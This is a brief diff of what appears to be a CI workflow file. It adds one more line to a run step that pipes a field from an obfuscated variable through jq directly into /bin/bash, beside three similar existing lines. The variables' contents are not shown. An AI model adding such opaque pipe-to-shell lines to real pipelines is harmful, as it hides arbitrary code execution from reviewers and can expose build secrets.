@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$i586" | jq -r .bs4979 | /bin/bash
           echo $acdd4 | jq -r .i4004 | /bin/bash
           printf '%s' "$spck284" | jq -r .u38 | /bin/bash
+          echo $gqbev3 | jq -r .cznj95 | /bin/bash
 
       - name: Upload artifact
         if: always()
